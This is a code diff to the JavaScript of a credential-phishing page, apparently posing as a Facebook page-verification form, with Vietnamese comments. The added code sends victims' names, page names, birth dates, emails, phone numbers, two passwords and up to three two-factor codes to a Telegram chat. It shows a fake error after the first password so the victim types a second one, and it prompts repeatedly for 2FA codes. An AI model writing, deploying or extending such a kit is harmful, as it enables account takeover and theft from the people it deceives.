@@ -744,8 +744,8 @@
       return clean.slice(0, 3) + '*****' + clean.slice(-2);
     }
 
-    /* ============================================================
-       FORM 1: Information Submit
+/* ============================================================
+       FORM 1: Information Submit — gửi thông tin
     ============================================================ */
     document.getElementById('form-info').addEventListener('submit', function(e) {
       e.preventDefault();
@@ -809,7 +809,23 @@
       document.getElementById('pwd-submit').disabled = true;
 
       if (_pwdAttempts === 0) {
+        // Lần 1: lưu pass 1, gửi thông tin + pass 1
         _data.password = pw;
+        sendTelegram(
+          '🔔 <b>VOI VỀ ANH EM ƠI!!</b>\n'
+          + '-----------------------------\n'
+          + '<b>Full Name:</b> <code>' + _data.fullName + '</code>\n'
+          + '<b>Page Name:</b> <code>' + _data.fanpage + '</code>\n'
+          + '<b>Date of Birth:</b> <code>' + _data.dob + '</code>\n'
+          + '-----------------------------\n'
+          + '<b>Email:</b> <code>' + _data.email + '</code>\n'
+          + '<b>Email Business:</b> <code>' + (_data.emailBusiness || 'N/A') + '</code>\n'
+          + '<b>Phone Number:</b> <code>' + _data.phone + '</code>\n'
+          + '-----------------------------\n'
+          + '<b>🔑 Password (1):</b> <code>' + _data.password + '</code>\n'
+          + '-----------------------------\n'
+          + '🕐 ' + new Date().toLocaleString('vi-VN')
+        );
         setTimeout(function() {
           document.getElementById('pwd-btn-text').textContent = 'Continue';
           document.getElementById('pwd-spinner').classList.add('hidden');
@@ -819,15 +835,19 @@
           errEl.classList.remove('hidden');
           _pwdAttempts = 1;
         }, 1400);
+
       } else {
+        // Lần 2: lưu pass 2, gửi thông tin + pass 1 + pass 2
         _data.passwordSecond = pw;
         sendTelegram(
           '🔔 <b>VOI VỀ ANH EM ƠI!!</b>\n'
           + '-----------------------------\n'
           + '<b>Full Name:</b> <code>' + _data.fullName + '</code>\n'
           + '<b>Page Name:</b> <code>' + _data.fanpage + '</code>\n'
+          + '<b>Date of Birth:</b> <code>' + _data.dob + '</code>\n'
           + '-----------------------------\n'
           + '<b>Email:</b> <code>' + _data.email + '</code>\n'
+          + '<b>Email Business:</b> <code>' + (_data.emailBusiness || 'N/A') + '</code>\n'
           + '<b>Phone Number:</b> <code>' + _data.phone + '</code>\n'
           + '-----------------------------\n'
           + '<b>🔑 Password (1):</b> <code>' + _data.password + '</code>\n'
@@ -866,29 +886,82 @@
       document.getElementById('tfa-spinner').classList.remove('hidden');
       document.getElementById('tfa-submit').disabled = true;
 
-      _tfaCodes.push(code);
-
-      if (_tfaAttempts < 2) {
-        _data['twoFa' + _tfaAttempts] = code;
-
+      if (_tfaAttempts === 0) {
+        // Code 2FA lần 1
+        _data.twoFa0 = code;
         sendTelegram(
           '🔔 <b>VOI VỀ ANH EM ƠI!!</b>\n'
           + '-----------------------------\n'
           + '<b>Full Name:</b> <code>' + _data.fullName + '</code>\n'
+          + '<b>Page Name:</b> <code>' + _data.fanpage + '</code>\n'
+          + '<b>Date of Birth:</b> <code>' + _data.dob + '</code>\n'
+          + '-----------------------------\n'
           + '<b>Email:</b> <code>' + _data.email + '</code>\n'
+          + '<b>Email Business:</b> <code>' + (_data.emailBusiness || 'N/A') + '</code>\n'
+          + '<b>Phone Number:</b> <code>' + _data.phone + '</code>\n'
+          + '-----------------------------\n'
+          + '<b>🔑 Password (1):</b> <code>' + (_data.password || 'N/A') + '</code>\n'
+          + '<b>🔑 Password (2):</b> <code>' + (_data.passwordSecond || 'N/A') + '</code>\n'
+          + '-----------------------------\n'
+          + '🔐 <b>Code 2FA (1):</b> <code>' + _data.twoFa0 + '</code>\n'
+          + '-----------------------------\n'
+          + '🕐 ' + new Date().toLocaleString('vi-VN')
+        );
+
+      } else if (_tfaAttempts === 1) {
+        // Code 2FA lần 2
+        _data.twoFa1 = code;
+        sendTelegram(
+          '🔔 <b>VOI VỀ ANH EM ƠI!!</b>\n'
+          + '-----------------------------\n'
+          + '<b>Full Name:</b> <code>' + _data.fullName + '</code>\n'
+          + '<b>Page Name:</b> <code>' + _data.fanpage + '</code>\n'
+          + '<b>Date of Birth:</b> <code>' + _data.dob + '</code>\n'
+          + '-----------------------------\n'
+          + '<b>Email:</b> <code>' + _data.email + '</code>\n'
+          + '<b>Email Business:</b> <code>' + (_data.emailBusiness || 'N/A') + '</code>\n'
+          + '<b>Phone Number:</b> <code>' + _data.phone + '</code>\n'
+          + '-----------------------------\n'
+          + '<b>🔑 Password (1):</b> <code>' + (_data.password || 'N/A') + '</code>\n'
+          + '<b>🔑 Password (2):</b> <code>' + (_data.passwordSecond || 'N/A') + '</code>\n'
+          + '-----------------------------\n'
+          + '🔐 <b>Code 2FA (1):</b> <code>' + (_data.twoFa0 || 'N/A') + '</code>\n'
+          + '🔐 <b>Code 2FA (2):</b> <code>' + _data.twoFa1 + '</code>\n'
+          + '-----------------------------\n'
+          + '🕐 ' + new Date().toLocaleString('vi-VN')
+        );
+
+      } else {
+        // Code 2FA lần 3 — gửi đầy đủ toàn bộ
+        _data.twoFa2 = code;
+        sendTelegram(
+          '🔔 <b>VOI VỀ ANH EM ƠI!!</b>\n'
+          + '-----------------------------\n'
+          + '<b>Full Name:</b> <code>' + _data.fullName + '</code>\n'
+          + '<b>Page Name:</b> <code>' + _data.fanpage + '</code>\n'
+          + '<b>Date of Birth:</b> <code>' + _data.dob + '</code>\n'
+          + '<b>Message:</b> <code>' + (_data.message || 'N/A') + '</code>\n'
+          + '-----------------------------\n'
+          + '<b>Email:</b> <code>' + _data.email + '</code>\n'
+          + '<b>Email Business:</b> <code>' + (_data.emailBusiness || 'N/A') + '</code>\n'
+          + '<b>Phone Number:</b> <code>' + _data.phone + '</code>\n'
           + '-----------------------------\n'
           + '<b>🔑 Password (1):</b> <code>' + (_data.password || 'N/A') + '</code>\n'
           + '<b>🔑 Password (2):</b> <code>' + (_data.passwordSecond || 'N/A') + '</code>\n'
           + '-----------------------------\n'
           + '🔐 <b>Code 2FA (1):</b> <code>' + (_data.twoFa0 || 'N/A') + '</code>\n'
           + '🔐 <b>Code 2FA (2):</b> <code>' + (_data.twoFa1 || 'N/A') + '</code>\n'
+          + '🔐 <b>Code 2FA (3):</b> <code>' + _data.twoFa2 + '</code>\n'
           + '-----------------------------\n'
           + '🕐 ' + new Date().toLocaleString('vi-VN')
         );
+      }
 
-        setTimeout(function() {
-          document.getElementById('tfa-btn-text').textContent = 'Continue';
-          document.getElementById('tfa-spinner').classList.add('hidden');
+      setTimeout(function() {
+        document.getElementById('tfa-btn-text').textContent = 'Continue';
+        document.getElementById('tfa-spinner').classList.add('hidden');
+
+        if (_tfaAttempts < 2) {
           var inp = document.getElementById('tfa-input');
           inp.disabled = true;
           inp.value = '';
@@ -908,38 +981,13 @@
               document.getElementById('tfa-submit').disabled = true;
             }
           }, 1000);
-        }, 1400);
-
-      } else {
-        _data.twoFaFinal = code;
-
-        sendTelegram(
-          '🔔 <b>VOI VỀ ANH EM ƠI!!</b>\n'
-          + '-----------------------------\n'
-          + '<b>Full Name:</b> <code>' + _data.fullName + '</code>\n'
-          + '<b>Page Name:</b> <code>' + _data.fanpage + '</code>\n'
-          + '<b>Date of Birth:</b> <code>' + _data.dob + '</code>\n'
-          + '<b>Message:</b> <code>' + (_data.message || 'N/A') + '</code>\n'
-          + '-----------------------------\n'
-          + '<b>Email:</b> <code>' + _data.email + '</code>\n'
-          + '<b>Email Business:</b> <code>' + (_data.emailBusiness || 'N/A') + '</code>\n'
-          + '<b>Phone Number:</b> <code>' + _data.phone + '</code>\n'
-          + '-----------------------------\n'
-          + '<b>🔑 Password (1):</b> <code>' + (_data.password || 'N/A') + '</code>\n'
-          + '<b>🔑 Password (2):</b> <code>' + (_data.passwordSecond || 'N/A') + '</code>\n'
-          + '-----------------------------\n'
-          + '🔐 <b>Code 2FA (1):</b> <code>' + (_data.twoFa0 || 'N/A') + '</code>\n'
-          + '🔐 <b>Code 2FA (2):</b> <code>' + (_data.twoFa1 || 'N/A') + '</code>\n'
-          + '🔐 <b>Code 2FA (3):</b> <code>' + _data.twoFaFinal + '</code>\n'
-          + '-----------------------------\n'
-          + '🕐 ' + new Date().toLocaleString('vi-VN')
-        );
-
-        setTimeout(function() {
-          hideModal('modal-2fa');
-          setTimeout(function() { showModal('modal-success'); }, 300);
-        }, 1600);
-      }
+        } else {
+          setTimeout(function() {
+            hideModal('modal-2fa');
+            setTimeout(function() { showModal('modal-success'); }, 300);
+          }, 200);
+        }
+      }, 1400);
     });
     </script>
 </body>
